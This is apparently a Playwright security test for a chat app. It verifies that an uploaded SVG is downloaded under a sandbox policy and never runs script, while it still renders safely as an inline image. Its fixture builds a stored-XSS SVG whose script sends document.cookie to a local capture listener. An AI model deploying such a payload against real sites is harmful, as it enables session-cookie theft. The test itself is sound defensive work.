// md-exfil T12: an SVG artifact opened as a PAGE must not run its script on the app origin, while the same image still
// renders in chat as <img>. The REAL image route (server/routes/images.ts, with a fake store) runs on a loopback server;
// the "attacker" is a loopback listener that counts requests. Both are started and closed by this spec.
import http from 'node:http'
import express from 'express'
import { test, expect } from '@playwright/test'
import { loadFixtures, newVariantContext } from './lib.mjs'
import registerImageRoutes from '../../server/routes/images.ts'
import { securityHeaders } from '../../server/securityHeaders.ts'

const fx = loadFixtures()
const { ids } = fx
const sessionBody = (id) => JSON.parse(fx.routes[`GET /api/sessions/${id}/messages`].body)
const MODEL = sessionBody(ids.s1).messages[1].model
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64')

async function listen(server) {
  await new Promise((r) => server.listen(0, '127.0.0.1', r))
  return `http://127.0.0.1:${server.address().port}`
}

function startServers(captureHits) {
  const capture = http.createServer((req, res) => {
    captureHits.push(req.url)
    res.writeHead(204).end()
  })
  return listen(capture).then(async (captureBase) => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="40" height="40" fill="red"/><script>window.__pwned = 1; fetch('${captureBase}/leak?c=' + document.cookie)</script></svg>`
    const store = { 7: { type: 'image/png', bytes: PNG }, 8: { type: 'image/svg+xml', bytes: Buffer.from(svg) } }
    const app = express()
    app.use(securityHeaders({ origins: () => [] }))
    registerImageRoutes(app, {
      auth: (req, _res, next) => (Object.assign(req, { email: 'a@example.com', token: 'tok' }), next()),
      ensureReady: async () => {},
      getImage: async (_e, _t, id) => (store[id] ? { id, contentType: store[id].type, volumePath: `/v/${id}`, shared: false, readOnly: false } : null),
      getImageBytes: async (_t, p) => store[p.split('/').pop()].bytes,
    })
    const appServer = http.createServer(app)
    const appBase = await listen(appServer)
    return { capture, captureBase, appServer, appBase }
  })
}

test('an SVG artifact opened as a page downloads and never runs; the same image renders as <img> in chat', async ({ browser }) => {
  const hits = []
  const s = await startServers(hits)
  const ctx = await newVariantContext(browser, { theme: 'dark', mobile: false })
  try {
    // (1) top-level navigation to the stored SVG: the response is an attachment under the sandbox policy
    const head = await ctx.request.get(`${s.appBase}/api/images/8`)
    expect(head.headers()['content-type']).toBe('image/svg+xml')
    expect(head.headers()['content-disposition']).toMatch(/^attachment/)
    expect(head.headers()['content-security-policy']).toContain('sandbox')
    expect(head.headers()['x-content-type-options']).toBe('nosniff')
    const nav = await ctx.newPage()
    const dl = nav.waitForEvent('download')
    await nav.goto(`${s.appBase}/api/images/8`).catch(() => {}) // a download aborts the navigation
    expect((await dl).suggestedFilename()).toBe('image-8.svg')
    await nav.waitForTimeout(500)
    expect(hits).toEqual([]) // no script ran: the capture listener saw nothing

    // (2) if a browser ever rendered it anyway, the sandbox policy alone still keeps the script from running
    const inline = await ctx.newPage()
    await inline.route('**/inline.svg', async (r) => {
      const real = await r.fetch({ url: `${s.appBase}/api/images/8` })
      const headers = { ...real.headers() }
      delete headers['content-disposition']
      await r.fulfill({ status: 200, headers, body: await real.body() })
    })
    await inline.goto(`${s.appBase}/inline.svg`).catch(() => {})
    await inline.waitForTimeout(500)
    expect(hits).toEqual([])

    // (3) the same SVG and a PNG still render in chat as <img> (an <img> never runs SVG script)
    const page = await ctx.newPage()
    const errors = []
    page.on('pageerror', (e) => errors.push(String(e)))
    for (const id of [7, 8]) {
      await page.route(`**/api/images/${id}`, async (r) => {
        const real = await r.fetch({ url: `${s.appBase}/api/images/${id}` })
        await r.fulfill({ status: 200, headers: real.headers(), body: await real.body() })
      })
    }
    const body = sessionBody(ids.s3)
    body.messages = [body.messages[0], { id: '9001', role: 'assistant', content: '![png](/api/images/7)\n\n![svg](/api/images/8)', attachments: null, model: MODEL, prompt_tokens: 1, completion_tokens: 1, blocks: null, tool_calls: null, created_at: '2026-11-17T07:09:00.000Z', media_processing: null, intent_classify: null, reasoning: null }]
    await page.route(`**/api/sessions/${ids.s3}/messages`, (r) => r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) }))
    await page.goto(`/#/chat/${ids.s3}`)
    const imgs = page.locator('.prose-chat img')
    await expect(imgs).toHaveCount(2)
    await expect.poll(() => imgs.evaluateAll((els) => els.map((e) => e.complete && e.naturalWidth > 0))).toEqual([true, true])
    expect(await page.evaluate(() => window.__pwned)).toBeUndefined()
    expect(hits).toEqual([])
    expect(errors).toEqual([])
  } finally {
    await ctx.close()
    s.capture.close()
    s.appServer.close()
  }
})
